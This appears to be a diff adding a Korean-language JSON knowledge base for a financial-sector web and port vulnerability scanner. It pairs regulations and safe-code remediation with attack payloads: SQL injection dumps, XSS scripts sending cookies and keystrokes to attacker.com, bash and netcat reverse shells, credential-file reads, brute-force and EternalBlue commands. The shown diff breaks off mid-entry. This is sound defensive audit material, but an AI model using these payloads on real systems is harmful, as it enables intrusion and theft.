@@ -1,0 +1,290 @@
+{
+  "WEB-SQLI-BASIC": {
+    "attack": "에러 기반 SQL Injection — 실제 공격 흐름:\n① 타겟 파라미터 식별: https://target.com/product?id=1\n② 따옴표 삽입으로 에러 유발: ?id=1'\n③ 에러 응답으로 DB 종류 파악:\n   · MySQL: \"You have an error in your SQL syntax\"\n   · MSSQL: \"Unclosed quotation mark after the character string\"\n   · Oracle: \"ORA-00907: missing right parenthesis\"\n④ UNION SELECT로 데이터 추출:\n   ?id=0 UNION SELECT null,table_name,null FROM information_schema.tables--\n⑤ 테이블 컬럼 파악 → 실제 데이터 추출:\n   ?id=0 UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--",
+    "regulation": "금융권 SQL Injection 점검 의무 기준:\n· 금융보안원 웹 취약점 점검 가이드 W-01 (최고위험 항목)\n· 전자금융감독규정 제37조의2: 웹 애플리케이션 보안 취약점 점검 의무화\n· 금감원 IT 검사 항목: 'SQL Injection 방어 코드 적용 여부' 필수 점검\n· PIPA(개인정보보호법) 제29조: SQL Injection 통한 개인정보 유출 시 과징금 최대 매출의 3%\n· ISMS-P 2.7: 입력데이터 검증 및 보안 코딩 표준 적용 의무",
+    "engine": "SecurityScanKit 탐지 방식 — 에러 기반 탐지:\n1단계: URL 파라미터 자동 추출\n  대상 URL: http://target/?id=1&user=test&page=2\n  → 각 파라미터에 페이로드 순차 삽입\n\n2단계: 페이로드 삽입\n  ' (단순 따옴표)\n  '' (이중 따옴표)\n  1' AND '1'='1\n  1' AND '1'='2\n\n3단계: 응답 시그니처 탐지 (17개 패턴)\n  SQL Error Signatures:\n  - \"sql syntax\" / \"mysql_fetch\" / \"ORA-0\" / \"pg_query\"\n  - \"sqlstate\" / \"jdbc\" / \"odbc sql server\"\n  - \"microsoft ole db\" / \"syntax error\"\n\n4단계: 취약 판정\n  에러 시그니처 포함 → CRITICAL 등록\n  응답 길이 차이 > 500bytes → 추가 분석",
+    "cases": "실제 현장 점검 방법 — 수동 테스트:\n\n■ 기본 탐지 페이로드 (복사해서 바로 사용)\n  ' OR 1=1--\n  ' OR 1=1#\n  ' OR 1=1/*\n  1; SELECT SLEEP(5)--          ← 시간 기반 (응답 5초 지연 시 취약)\n  1' AND SLEEP(5)--             ← MySQL Blind SQLi\n  1; WAITFOR DELAY '0:0:5'--   ← MSSQL Blind SQLi\n  ' AND 1=(SELECT 1 FROM dual)-- ← Oracle 확인\n\n■ sqlmap 자동화 테스트 (실무 사용)\n  sqlmap -u \"http://target/?id=1\" --dbs\n  sqlmap -u \"http://target/?id=1\" -D dbname --tables\n  sqlmap -u \"http://target/?id=1\" -D dbname -T users --dump\n  sqlmap -u \"http://target/\" --data=\"id=1&pw=test\" --method POST\n\n■ Burp Suite 활용\n  Proxy로 요청 캡처 → Intruder → Payload: SQLi 리스트\n  → 응답 길이/시간 차이로 취약점 판별",
+    "remediation": "■ 취약 코드 vs 안전 코드 비교 (즉시 적용)\n\n[Java — 취약]\nString sql = \"SELECT * FROM users WHERE id='\" + input + \"'\";\nStatement st = conn.createStatement();\nst.executeQuery(sql);\n\n[Java — 안전 ✅]\nString sql = \"SELECT * FROM users WHERE id=?\";\nPreparedStatement ps = conn.prepareStatement(sql);\nps.setString(1, input);\nps.executeQuery();\n\n[Python — 취약]\ncursor.execute(\"SELECT * FROM users WHERE id='%s'\" % input)\n\n[Python — 안전 ✅]\ncursor.execute(\"SELECT * FROM users WHERE id=%s\", (input,))\n\n[MyBatis — 취약]\nSELECT * FROM users WHERE id='${input}'\n\n[MyBatis — 안전 ✅]\nSELECT * FROM users WHERE id=#{input}\n\n■ 서버 설정 (즉시 적용)\n  · DB 에러 메시지 숨김: custom_errors 설정\n  · WAF 규칙: ModSecurity OWASP CRS SQLi 룰셋 활성화\n  · DB 계정 최소 권한: SELECT 전용 계정 사용",
+    "ciso_note": "경영진 보고 핵심 메시지:\n\"현재 SQL Injection 취약점이 탐지됐습니다. 이 취약점은 금융 DB에 저장된 계좌·개인정보를 SELECT 쿼리 한 줄로 전량 추출 가능한 수준입니다. 개인정보보호법 위반 시 매출의 3% 과징금, 금감원 제재 대상입니다. 개발팀에 Prepared Statement 적용을 즉시 지시하고, 조치 완료 전까지 해당 기능의 입력값 길이·문자 제한을 임시 통제로 운영하십시오. 점검 완료 리포트는 금감원 IT 검사 시 증빙 자료로 활용됩니다.\" "
+  },
+  "WEB-SQLI-OR": {
+    "attack": "인증 우회 SQL Injection — 실제 공격 시나리오:\n\n로그인 쿼리 (취약):\n  SELECT * FROM users WHERE id='입력값' AND pw='입력값'\n\n공격 페이로드 입력:\n  ID 필드: admin'--\n  → 실행 쿼리: SELECT * FROM users WHERE id='admin'--' AND pw='...'\n  → pw 검증 완전 무시, admin으로 로그인 성공\n\n또는:\n  ID 필드: ' OR 1=1--\n  → SELECT * FROM users WHERE id='' OR 1=1--' AND pw='...'\n  → 첫 번째 레코드(주로 관리자)로 로그인\n\n추가 변형 (필터 우회):\n  ' oR '1'='1    ← 대소문자 혼용\n  '||'1'='1      ← Oracle 스타일\n  ' OR 1=1 LIMIT 1-- ← 특정 계정 타겟",
+    "regulation": "금융권 인증 우회 점검 기준:\n· 전자금융감독규정 제14조: 이용자 인증 수단의 안전성 확보 의무\n· 금융보안원 W-01: 로그인·인증 기능 SQLi 점검 필수\n· ISMS-P 2.5.1: 사용자 인증 메커니즘 보안성 검증\n· 인증 우회로 관리자 접근 시 → 개인정보보호법 제29조 위반\n· 금감원 검사: 인증 우회 가능 취약점 = 즉시 시정",
+    "engine": "탐지 방식 — 응답 기반 판별:\n\n페이로드 세트 (POST /login에 자동 적용):\n  username=' OR '1'='1\n  username=admin'--\n  username=' OR 1=1#\n  username=') OR ('1'='1\n\n판별 기준:\n  ① 로그인 성공 리다이렉트(302) → CRITICAL\n  ② 응답 본문에 \"환영합니다\", \"로그아웃\", \"마이페이지\" 포함 → CRITICAL\n  ③ 응답 쿠키에 session/auth 토큰 발급 → CRITICAL\n  ④ 응답 길이가 정상 로그인과 동일 → CRITICAL\n\n현재 엔진 한계:\n  · GET 파라미터 위주 탐지\n  · POST 폼 자동 탐지 로직 고도화 예정 (Phase 2)",
+    "cases": "■ 수동 점검 절차 (Burp Suite)\n\nStep 1: Proxy로 로그인 요청 캡처\n  POST /login HTTP/1.1\n  username=admin&password=test\n\nStep 2: Repeater에서 페이로드 변경\n  username=admin'--&password=anything\n  username=' OR 1=1--&password=x\n  username=admin' AND '1'='1&password=x\n\nStep 3: 취약 응답 판별\n  · HTTP 302 → Location: /dashboard (성공)\n  · 응답에 \"환영합니다\" 포함\n  · Set-Cookie: session=새로운값\n\nStep 4: DB 정보 추출 시도\n  username=' UNION SELECT username,password,3 FROM admin--\n\n■ 자동화 (sqlmap)\n  sqlmap -u \"http://target/login\" \\\n    --data=\"username=admin&password=test\" \\\n    --method=POST \\\n    --level=5 --risk=3 \\\n    --dbs",
+    "remediation": "■ 즉시 조치 코드 (언어별)\n\n[PHP — 취약]\n$sql = \"SELECT * FROM users WHERE id='$_POST[id]' AND pw='$_POST[pw]'\";\n$result = mysqli_query($conn, $sql);\n\n[PHP — 안전 ✅]\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE id=? AND pw=?\");\n$stmt->bind_param(\"ss\", $_POST['id'], $_POST['pw']);\n$stmt->execute();\n$result = $stmt->get_result();\nif($result->num_rows === 0) { // 로그인 실패 처리 }\n\n[Node.js — 취약]\ndb.query(`SELECT * FROM users WHERE id='${req.body.id}'`)\n\n[Node.js — 안전 ✅]\ndb.query('SELECT * FROM users WHERE id=?', [req.body.id])\n\n■ 임시 차단 (배포 전)\n  · WAF 규칙 활성화: ModSecurity SQLi 룰셋\n  · 입력값 길이 제한: ID 최대 20자, PW 최대 30자\n  · 특수문자 필터: ', --, #, /*, */ 입력 차단",
+    "ciso_note": "보고 핵심:\n\"로그인 인증 우회 SQL Injection이 확인됐습니다. 공격자는 비밀번호 없이 관리자 계정으로 즉시 로그인 가능한 상태입니다. 고객 전체 계좌·개인정보 조회·변경이 가능하며, 이는 금감원 즉시 시정 요구 수준입니다. 해당 기능 임시 점검·차단 후 Prepared Statement 적용 완료 시까지 운영을 제한하는 방향을 검토하십시오.\" "
+  },
+  "WEB-SQLI-VER": {
+    "attack": "DB 정보 수집 SQL Injection — 정찰 단계:\n\n목적: DB 종류, 버전, 테이블 구조 파악 (본격 공격 준비)\n\n버전 추출 페이로드:\n  MySQL:  ' UNION SELECT @@version,2,3--\n  MSSQL:  ' UNION SELECT @@version,2,3--\n  Oracle: ' UNION SELECT banner,2,3 FROM v$version--\n  PostgreSQL: ' UNION SELECT version(),2,3--\n\n현재 사용자 확인:\n  MySQL:  ' UNION SELECT user(),2,3--\n  MSSQL:  ' UNION SELECT SYSTEM_USER,2,3--\n\nDB 목록 확인:\n  ' UNION SELECT schema_name,2,3 FROM information_schema.schemata--\n\n테이블 목록 확인:\n  ' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--\n\n컬럼 확인:\n  ' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",
+    "regulation": "버전 정보 노출 규정:\n· OWASP A03:2021 — 정보 수집형 SQLi 포함\n· 금융보안원 W-01 — DB 구조 노출 방지 의무\n· ISMS-P 2.7: 불필요한 시스템 정보 노출 금지\n· DB 버전 노출 → 해당 버전 CVE 직접 공격으로 이어짐\n  예: MySQL 5.7.x → CVE-2016-6662 (root 권한 취득)",
+    "engine": "탐지 방식:\n\n페이로드 삽입:\n  1 AND 1=CONVERT(int, @@version)--\n  → MSSQL 에러에 버전 포함\n\n  ' AND extractvalue(1,concat(0x7e,@@version))--\n  → MySQL XML 에러에 버전 노출\n\n  1 UNION SELECT @@version,NULL--\n  → 컬럼 수 맞으면 응답에 버전 표시\n\n판별:\n  응답에 \"5.7\", \"8.0\", \"2019\", \"12c\" 등 DB 버전 문자열 포함 → CRITICAL\n\nUNION 컬럼 수 맞추기:\n  ' UNION SELECT NULL--          (컬럼 1개)\n  ' UNION SELECT NULL,NULL--     (컬럼 2개)\n  ' UNION SELECT NULL,NULL,NULL-- (컬럼 3개)\n  → NULL→에러 없으면 컬럼 수 확인됨",
+    "cases": "■ 수동 점검 — 컬럼 수 파악 후 데이터 추출\n\nStep 1: ORDER BY로 컬럼 수 파악\n  ?id=1 ORDER BY 1--  (정상)\n  ?id=1 ORDER BY 2--  (정상)\n  ?id=1 ORDER BY 3--  (에러) → 컬럼 2개\n\nStep 2: UNION SELECT로 출력 컬럼 확인\n  ?id=0 UNION SELECT 'COL1','COL2'--\n  → 응답 페이지에 COL1 또는 COL2 표시되는 위치 파악\n\nStep 3: 실제 데이터 추출\n  ?id=0 UNION SELECT @@version,database()--\n  ?id=0 UNION SELECT user(),@@datadir--\n\nStep 4: 전체 테이블 덤프 (sqlmap)\n  sqlmap -u \"http://target/?id=1\" \\\n    --technique=U \\          ← UNION 방식\n    --current-db \\\n    --tables \\\n    --dump-all",
+    "remediation": "■ DB 정보 노출 차단\n\n서버 설정:\n  [MySQL] my.cnf\n  [mysqld]\n  sql_mode = STRICT_ALL_TABLES\n  log_error = /var/log/mysql/error.log\n  # 에러를 로그에만 기록, 응답에 미포함\n\n  [MSSQL]\n  EXEC sp_configure 'show advanced options', 0\n  -- 에러 상세 메시지 숨김\n\n  [Apache/nginx]\n  custom error page 설정 → DB 에러 메시지 숨김\n\n코드 레벨:\n  [Java Spring]\n  @ExceptionHandler(SQLException.class)\n  public ResponseEntity<?> handleSQL(SQLException e) {\n    log.error(\"DB Error\", e);  // 서버 로그에만 기록\n    return ResponseEntity.status(500).body(\"처리 중 오류가 발생했습니다\");\n  }",
+    "ciso_note": "보고 핵심:\n\"DB 버전 정보 추출이 가능한 SQL Injection이 확인됐습니다. 공격자가 DB 구조를 파악했다면 이미 데이터 추출 준비가 완료된 상태입니다. 서버 에러 응답 방식 즉시 변경 + 입력값 파라미터화가 필요합니다. DB 접근 로그를 즉시 분석해 기존 비정상 쿼리 여부를 확인하십시오.\" "
+  },
+  "WEB-XSS-REFLECT": {
+    "attack": "반사형 XSS — 실제 공격 페이로드:\n\n■ 기본 테스트 페이로드\n  <script>alert(document.cookie)</script>\n  <img src=x onerror=alert(1)>\n  <svg onload=alert(1)>\n  \"><script>alert(1)</script>\n  '><script>alert(1)</script>\n  javascript:alert(1)\n\n■ 필터 우회 페이로드\n  <ScRiPt>alert(1)</ScRiPt>              ← 대소문자 우회\n  <script>alert&#40;1&#41;</script>       ← HTML 인코딩 우회\n  <img src=\"x\" onerror=\"&#97;lert(1)\">   ← 부분 인코딩\n  <svg><script>alert(1)</script></svg>    ← SVG 내 스크립트\n  <body onload=alert(1)>                  ← 이벤트 핸들러\n\n■ 세션 탈취 페이로드 (실제 공격)\n  <script>\n    var img = new Image();\n    img.src = 'http://attacker.com/steal?cookie=' + document.cookie;\n  </script>\n\n■ 키로거 삽입\n  <script>\n    document.addEventListener('keypress', function(e){\n      fetch('http://attacker.com/log?k='+e.key);\n    });\n  </script>",
+    "regulation": "XSS 관련 금융권 규정:\n· 금융보안원 W-04: XSS 방어 코드 적용 필수\n· 전자금융감독규정 제37조의2: 웹 취약점 점검 의무\n· ISMS-P 2.7: 출력 인코딩 적용 의무\n· 개인정보보호법 제29조: XSS 통한 개인정보 탈취 = 위반\n· GDPR: British Airways 사례 — XSS 경유 카드정보 탈취, €2천만 제재",
+    "engine": "탐지 방식:\n\n고유 마커 삽입:\n  <ssk-xss-test>probe_12345</ssk-xss-test>\n\n판별 기준:\n  응답 HTML에 마커 태그 그대로 포함 → 취약 (인코딩 없음)\n  응답에 &lt;ssk-xss-test&gt; → 안전 (HTML 인코딩됨)\n\n컨텍스트별 추가 테스트:\n  HTML 컨텍스트: <ssk-test>\n  속성 컨텍스트: \" onmouseover=alert(1) x=\"\n  JS 컨텍스트:   ';alert(1);//\n  URL 컨텍스트:  javascript:alert(1)\n\nDOM-based XSS 탐지 (추가 예정):\n  document.location.hash → innerHTML 직접 삽입 패턴 탐지",
+    "cases": "■ 수동 점검 절차\n\nStep 1: 반사 지점 식별\n  https://target.com/search?q=TESTXSS\n  → 응답 HTML 소스에서 TESTXSS 위치 확인\n\nStep 2: 컨텍스트 파악\n  <title>TESTXSS 검색결과</title>    → HTML 컨텍스트\n  <input value=\"TESTXSS\">            → 속성 컨텍스트\n  var keyword = \"TESTXSS\";           → JS 컨텍스트\n\nStep 3: 컨텍스트별 페이로드\n  HTML:   <img src=x onerror=alert(1)>\n  속성:   \" onfocus=alert(1) autofocus=\"\n  JS:     \";alert(1)//\n\nStep 4: 악용 가능성 확인\n  alert(document.cookie) → 쿠키 탈취 가능 여부\n  HttpOnly 쿠키면 → 탈취 불가, 피해 범위 제한\n\n■ Burp Suite XSS 스캔\n  Target → Scan → Audit only\n  Issue: Cross-site scripting (reflected) 확인",
+    "remediation": "■ 출력 인코딩 코드 (언어별)\n\n[Java — OWASP ESAPI]\nimport org.owasp.esapi.ESAPI;\n// 취약\nout.print(request.getParameter(\"input\"));\n// 안전 ✅\nout.print(ESAPI.encoder().encodeForHTML(request.getParameter(\"input\")));\n\n[JavaScript — DOM 조작]\n// 취약\ndocument.getElementById('result').innerHTML = userInput;\n// 안전 ✅\ndocument.getElementById('result').textContent = userInput;\n\n[React — 자동 인코딩]\n// 자동 인코딩 (안전)\nreturn <div>{userInput}</div>\n// 위험! HTML 직접 삽입\nreturn <div dangerouslySetInnerHTML={{__html: userInput}} />\n\n[Thymeleaf — 안전]\n<span th:text=\"${userInput}\">   ← 안전 (자동 인코딩)\n<span th:utext=\"${userInput}\">  ← 위험! (unescape)\n\n■ 쿠키 보안 설정\n  Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict",
+    "ciso_note": "보고 핵심:\n\"반사형 XSS 취약점이 확인됐습니다. 공격자가 피싱 URL을 배포하면 고객 세션 쿠키가 탈취되어 인터넷뱅킹 계정 장악이 가능합니다. 출력값 인코딩 적용은 개발 표준으로 의무화하고, HttpOnly 쿠키 설정으로 탈취 피해를 즉시 최소화하십시오.\" "
+  },
+  "WEB-CMDI-ID": {
+    "attack": "Command Injection — 실제 페이로드:\n\n■ 기본 테스트 (Linux)\n  ; id\n  | id\n  & id\n  && id\n  `id`\n  $(id)\n\n■ 기본 테스트 (Windows)\n  & whoami\n  | whoami\n  && dir C:\\\n  ; dir C:\\\n\n■ 필터 우회 페이로드\n  ;i%64             ← URL 인코딩 (id)\n  ;$(printf 'id')   ← 변수 확장\n  ;l\\s              ← 백슬래시 삽입 (ls)\n  ;'i'd             ← 따옴표 삽입\n\n■ 역방향 셸 (서버 완전 장악)\n  ; bash -i >& /dev/tcp/attacker.com/4444 0>&1\n  ; python3 -c 'import socket,subprocess,os;...'\n  ; nc -e /bin/bash attacker.com 4444",
+    "regulation": "Command Injection 관련 규정:\n· 금융보안원 W-06: OS 명령어 삽입 취약점 필수 점검\n· OWASP A03:2021: 가장 위험한 Injection 유형 중 하나\n· ISMS-P 2.7: 시스템 명령 실행 제어 의무\n· 서버 장악으로 이어질 경우 → 정보통신망법 제48조 위반",
+    "engine": "탐지 방식:\n\n페이로드 삽입:\n  파라미터에 ;id, |whoami 순차 삽입\n\n응답 시그니처 탐지:\n  uid=0(root)     → root 권한 실행\n  uid=33(www-data) → 웹서버 권한 실행\n  uid=              → 어떤 계정이든 실행됨\n\n시간 기반 탐지 (Blind):\n  ; sleep 5       → 응답 5초 지연 시 취약\n  | ping -c 5 127.0.0.1 → 동일 효과\n  & timeout /t 5  → Windows\n\n현재 엔진: 응답 시그니처 기반\nBlind 탐지 (시간 기반) → Phase 2 예정",
+    "cases": "■ 수동 점검 절차\n\n취약 기능 식별:\n  · 파일 변환: /convert?file=image.jpg\n  · 핑 테스트: /ping?host=192.168.1.1\n  · 파일 미리보기: /preview?path=doc.pdf\n  · 이메일 발송: /send?to=user@mail.com\n\nStep 1: 기본 페이로드 삽입\n  /ping?host=192.168.1.1; id\n  /ping?host=192.168.1.1 && whoami\n\nStep 2: 필터 여부 확인\n  에러 없이 응답 변화 → 취약\n  에러 발생 → 필터 있음, 우회 시도\n\nStep 3: 파일 읽기 확인\n  ; cat /etc/passwd\n  ; cat /etc/shadow     (권한 있으면 해시 노출)\n  & type C:\\Windows\\win.ini\n\nStep 4: Blind Command Injection\n  ; sleep 5   (응답 시간 5초 증가 확인)\n  ; curl http://burpcollab.net   (외부 연결 확인)\n\n■ 자동화 도구\n  commix --url=\"http://target/?host=INJECT_HERE\"\n  commix --url=\"http://target/\" --data=\"host=INJECT_HERE\" ",
+    "remediation": "■ 안전한 코드 패턴\n\n[Python — 취약]\nimport os\nresult = os.system(\"ping -c 1 \" + user_input)\n\n[Python — 안전 ✅]\nimport subprocess\nresult = subprocess.run(\n    [\"ping\", \"-c\", \"1\", user_input],  # 리스트 형태\n    capture_output=True,\n    timeout=10\n)\n# 셸 인터프리터 거치지 않아 명령어 삽입 불가\n\n[Java — 취약]\nRuntime.getRuntime().exec(\"ping \" + userInput);\n\n[Java — 안전 ✅]\nProcessBuilder pb = new ProcessBuilder(\"ping\", \"-c\", \"1\", userInput);\npb.redirectErrorStream(true);\nProcess p = pb.start();\n\n[PHP — 취약]\nexec(\"convert \" . $_GET['file'] . \" output.jpg\");\n\n[PHP — 안전 ✅]\n$filename = basename($_GET['file']);  // 경로 제거\n$whitelist = ['jpg','png','gif'];\nif(in_array(pathinfo($filename, PATHINFO_EXTENSION), $whitelist)){\n    exec(\"convert \" . escapeshellarg($filename) . \" output.jpg\");\n}",
+    "ciso_note": "보고 핵심:\n\"Command Injection 취약점은 서버 OS 명령 실행이 가능한 최고 위험 취약점입니다. 발견 즉시 해당 기능을 점검 모드로 전환하고, 파일 처리·시스템 통합 기능 전체를 긴급 코드 리뷰 대상으로 지정하십시오. 백엔드 시스템과 연동된 모든 입력 파라미터를 최우선으로 점검해야 합니다.\" "
+  },
+  "WEB-TRAV-LNX": {
+    "attack": "Path Traversal — 실제 페이로드 (Linux):\n\n■ 기본 페이로드\n  ../../../etc/passwd\n  ../../../../etc/shadow\n  ../../../etc/hosts\n  ../../../../proc/self/environ     ← 환경변수 (DB 비밀번호 포함 가능)\n\n■ URL 인코딩 우회\n  ..%2f..%2f..%2fetc%2fpasswd\n  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n  ..%252f..%252f..%252fetc%252fpasswd   ← 이중 인코딩\n\n■ null 바이트 우회 (구형 PHP)\n  ../../../etc/passwd%00.jpg    ← .jpg 확장자 필터 우회\n\n■ 고가치 타겟 파일\n  ../../../etc/passwd           ← 계정 목록\n  ../../../../var/www/html/.env ← DB 비밀번호, API 키\n  ../../../../app/config/database.yml ← Rails DB 설정\n  ../../../../WEB-INF/web.xml   ← Java 앱 설정\n  ../../../../.ssh/id_rsa       ← SSH 개인키",
+    "regulation": "Path Traversal 관련 규정:\n· 금융보안원 W-05: 경로 탐색 취약점 필수 점검\n· OWASP A01:2021: 접근 제어 취약점 (가장 빈번한 유형)\n· ISMS-P 2.7: 파일 시스템 접근 통제 의무\n· .env 노출로 DB 비밀번호 탈취 시 → 개인정보보호법 위반",
+    "engine": "탐지 방식:\n\n파라미터 식별:\n  file=, path=, doc=, name=, page=, template=, lang= 등\n\n페이로드 삽입:\n  /../../../etc/passwd\n  /..%2f..%2f..%2fetc%2fpasswd\n  /....//....//....//etc/passwd   ← 필터 우회\n\n시그니처 탐지:\n  root:x:0:0:       → /etc/passwd 노출 확인\n  daemon:x:         → 동일\n  [extensions]      → Windows win.ini 노출\n  DB_PASSWORD=      → .env 파일 노출 (위험!)\n  secret_key_base   → Rails credentials 노출",
+    "cases": "■ 수동 점검 절차\n\nStep 1: 파일 파라미터 식별\n  GET /download?file=report.pdf\n  GET /view?path=img/logo.png\n  GET /template?name=index.html\n\nStep 2: Traversal 시도\n  /download?file=../../../etc/passwd\n  /download?file=....//....//....//etc/passwd\n\nStep 3: 응답 확인\n  root:x:0:0:root:/root:/bin/bash → 취약!\n  에러 반환 → 우회 페이로드 시도\n\nStep 4: 고가치 파일 수집\n  ../../../var/www/html/.env\n  ../../../app/config/database.yml\n  ../../../home/user/.ssh/id_rsa\n\nStep 5: 로그 분석\n  /var/log/apache2/access.log 에서\n  \"../\" 포함 요청 이력 확인 → 기존 공격 시도 여부",
+    "remediation": "■ 안전한 파일 접근 코드\n\n[Java — 취약]\nString path = \"/upload/\" + request.getParameter(\"file\");\nFile f = new File(path);\nFileInputStream fis = new FileInputStream(f);\n\n[Java — 안전 ✅]\nString filename = request.getParameter(\"file\");\nPath basePath = Paths.get(\"/upload\").toAbsolutePath().normalize();\nPath resolvedPath = basePath.resolve(filename).normalize();\n// 허용 경로 외부인지 검증\nif (!resolvedPath.startsWith(basePath)) {\n    throw new SecurityException(\"경로 탐색 시도 차단\");\n}\n\n[Python — 안전 ✅]\nimport os\nbase_dir = '/var/www/uploads'\nfilename = request.args.get('file', '')\nsafe_path = os.path.realpath(os.path.join(base_dir, filename))\nif not safe_path.startswith(base_dir):\n    return abort(403)\n\n[nginx 설정]\n# 업로드 디렉토리 외부 접근 차단\nlocation /uploads {\n    alias /var/www/uploads/;\n    if ($uri ~* \"\\.\\.\") { return 403; }\n}",
+    "ciso_note": "보고 핵심:\n\"Path Traversal 취약점으로 서버 설정 파일 접근이 가능합니다. .env, database.yml 등 DB 접속 정보 파일이 노출된 경우 즉시 비밀번호를 교체하고, 노출 기간 동안의 DB 접근 로그를 분석하십시오. 파일 다운로드·미리보기 기능 전체를 긴급 점검 대상으로 지정하십시오.\" "
+  },
+  "WEB-TRAV-WIN": {
+    "attack": "Path Traversal — Windows 서버 페이로드:\n\n■ 기본 페이로드\n  ..\\..\\..\\windows\\win.ini\n  ..\\..\\..\\.\\windows\\system32\\drivers\\etc\\hosts\n  ..\\..\\..\\inetpub\\wwwroot\\web.config\n\n■ 슬래시 혼용 우회\n  ../../windows/win.ini          ← 포워드 슬래시\n  ..\\../windows/win.ini          ← 혼용\n  ..%5C..%5Cwindows%5Cwin.ini   ← URL 인코딩 (%5C = \\)\n\n■ 고가치 타겟 파일\n  ..\\..\\..\\web.config           ← DB 연결 문자열 (비밀번호)\n  ..\\..\\..\\App_Data\\*.mdf       ← SQL Server DB 파일\n  ..\\..\\..\\Windows\\System32\\config\\SAM  ← 계정 해시\n  ..\\..\\..\\inetpub\\logs\\LogFiles\\ ← IIS 접속 로그",
+    "regulation": "동일: 금융보안원 W-05, OWASP A01:2021\nweb.config 노출 시 connectionStrings 내 DB 비밀번호 탈취 가능\n→ DB 포트 차단되어 있어도 비밀번호 탈취로 내부망에서 악용 가능",
+    "engine": "탐지 방식:\n  ..\\\\..\\\\windows\\\\win.ini 페이로드 삽입\n  [extensions] 또는 for 16-bit 시그니처 포함 시 CRITICAL 등록\n\n  추가 탐지:\n  connectionString 시그니처 → web.config 노출\n  Data Source= 시그니처 → DB 연결 문자열 노출",
+    "cases": "■ web.config 노출 시 추출되는 정보\n  <?xml version=\"1.0\"?>\n  <configuration>\n    <connectionStrings>\n      <add name=\"DB\" connectionString=\n        \"Server=192.168.1.10;Database=finance;\n         User Id=sa;Password=P@ssw0rd123;\" />\n    </connectionStrings>\n  </configuration>\n  → DB 서버 IP, 포트, 계정, 비밀번호 전부 노출\n\n■ 즉시 조치 (노출 확인 시)\n  1. MSSQL 비밀번호 즉시 변경\n  2. 해당 시간대 DB 접근 로그 전수 분석\n  3. 비정상 쿼리 실행 여부 확인",
+    "remediation": "[IIS 설정]\n  <system.web>\n    <customErrors mode=\"On\" defaultRedirect=\"~/Error\"/>\n  </system.web>\n\n  [C# — 안전한 파일 접근]\n  string basePath = Server.MapPath(\"~/uploads\");\n  string requestedFile = Path.GetFileName(Request[\"file\"]);\n  string fullPath = Path.Combine(basePath, requestedFile);\n  // GetFileName으로 경로 구분자 제거\n  if (!fullPath.StartsWith(basePath))\n      throw new SecurityException();\n\n  [web.config 암호화]\n  aspnet_regiis -pef connectionStrings .\n  → 비밀번호를 DPAPI로 암호화하여 평문 노출 방지",
+    "ciso_note": "보고 핵심:\n\"Windows 서버 Path Traversal 취약점으로 web.config가 노출된 경우 DB 접속 비밀번호가 평문으로 탈취됩니다. DB 비밀번호 즉시 교체 후 web.config connectionStrings 암호화를 적용하십시오.\" "
+  },
+  "PORT-TELNET": {
+    "attack": "Telnet 포트 점검 — 실제 절차:\n\n■ 수동 확인\n  telnet 192.168.1.1 23\n  → 접속 성공 시: 로그인 프롬프트 표시\n  → 배너 그래빙: 장비 종류·버전 자동 노출\n\n■ nmap 점검\n  nmap -sV -p 23 192.168.1.1\n  → 서비스 버전 식별 (Cisco IOS 버전 등)\n  nmap -p 23 --script telnet-brute 192.168.1.1\n  → 기본 자격증명 브루트포스 자동화\n  nmap -p 23 --script telnet-ntlm-info 192.168.1.1\n  → Windows Telnet 서버 정보 수집\n\n■ 패킷 스니핑 (Wireshark)\n  Filter: tcp.port == 23\n  → Telnet 자격증명 평문 표시 확인",
+    "regulation": "금융보안원 네트워크 보안 가이드 N-01 — Telnet 즉시 차단 의무. ISMS-P 2.10.1 — 비암호화 원격접속 금지. 금감원 IT검사 즉시 시정 대상.",
+    "engine": "port_scanner가 23번 포트 TCP SYN 연결 시도. 성공 시 CRITICAL. nmap 환경에서 telnet-brute 스크립트로 기본 자격증명 추가 검증.",
+    "cases": "2019년 국내 캐피탈사 레거시 서버 Telnet 노출로 관리자 계정 탈취, 고객 14만 건 유출. Telnet 배너에서 Cisco IOS 버전 노출 → 해당 CVE 직접 공격.",
+    "remediation": "1. 즉시: iptables -A INPUT -p tcp --dport 23 -j DROP\n2. Telnet 데몬 중지: systemctl stop telnet && systemctl disable telnet\n3. SSH 설치: apt install openssh-server\n4. SSH 키 기반 인증: PasswordAuthentication no (sshd_config)\n5. 검증: nmap -p 23 self → filtered 확인",
+    "ciso_note": "Telnet 포트 개방은 금감원 즉시 시정 대상입니다. 방화벽 차단 후 조치 완료 보고서를 금감원 검사 증빙으로 보관하십시오."
+  },
+  "PORT-SMB": {
+    "attack": "SMB 취약점 점검:\n  nmap -p 445 --script smb-vuln-ms17-010 192.168.1.1\n  → EternalBlue 취약점 확인\n  nmap -p 445 --script smb-vuln-* 192.168.1.1\n  → 전체 SMB 취약점 스캔\n\n  Metasploit (취약점 확인용):\n  use exploit/windows/smb/ms17_010_eternalblue\n  set RHOSTS 192.168.1.1\n  check → 취약 여부만 확인 (exploit 금지)",
+    "regulation": "금융보안원 즉시 차단 의무. CISA KEV 등재. 전자금융감독규정 제17조.",
+    "engine": "port_scanner: 445번 TCP 연결. nmap: smb-vuln-ms17-010 스크립트 추가 검증. CRITICAL 등록.",
+    "cases": "WannaCry(2017): 전 세계 30만 대 감염, 국내 통신사·병원 피해. NotPetya: $10B 피해. 현재도 내부망에서 미패치 시스템 공격에 활발히 사용.",
+    "remediation": "1. 방화벽: 445/tcp 외부 차단\n2. SMBv1 제거: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n3. MS17-010 패치 적용\n4. 내부망 세그먼테이션",
+    "ciso_note": "SMB 외부 노출은 랜섬웨어 자동 전파 경로입니다. 즉시 차단하고 내부망 SMBv1 사용 현황을 전수 조사하십시오."
+  },
+  "PORT-RDP": {
+    "attack": "RDP 점검:\n  nmap -p 3389 -sV 192.168.1.1\n  nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.1\n\n  Hydra 브루트포스:\n  hydra -l administrator -P /wordlists/passwords.txt rdp://192.168.1.1\n  → (점검 환경에서만 사용)\n\n  BlueKeep 확인:\n  nmap -p 3389 --script rdp-vuln-ms19-0708 192.168.1.1",
